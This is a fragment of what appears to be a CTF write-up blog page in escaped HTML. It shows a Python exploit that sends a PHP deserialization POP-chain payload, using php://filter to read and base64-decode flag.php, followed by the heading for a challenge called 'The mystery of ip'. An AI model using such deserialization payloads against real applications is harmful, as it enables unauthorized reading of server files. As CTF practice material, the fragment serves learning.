payload = &#39;O:4:&#34;Show&#34;:2:{s:6:&#34;source&#34;;O:4:&#34;Show&#34;:2:{s:6:&#34;source&#34;;s:9:&#34;index.php&#34;;s:3:&#34;str&#34;;O:4:&#34;Test&#34;:1:{s:1:&#34;p&#34;;O:8:&#34;Modifier&#34;:1:{s:6:&#34;\00*\00var&#34;;s:57:&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;}}}s:3:&#34;str&#34;;N;}&#39;
res = requests.get(url+payload)
print(base64.b64decode(res.text))

 &lt;h2 id=&#34;bjdctf2020the-mystery-of-ip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf2020the-mystery-of-ip&#34;&gt;#&lt;/a&gt; [BJDCTF2020]The mystery of ip&lt;/h2&gt;
&lt;h3 id=&#34;image-20240428191224568&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#image-20240428191224568&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428191224568.png&#34; alt=&#34;image-20240428191224568&#34;&gt;&lt;/h3&gt;
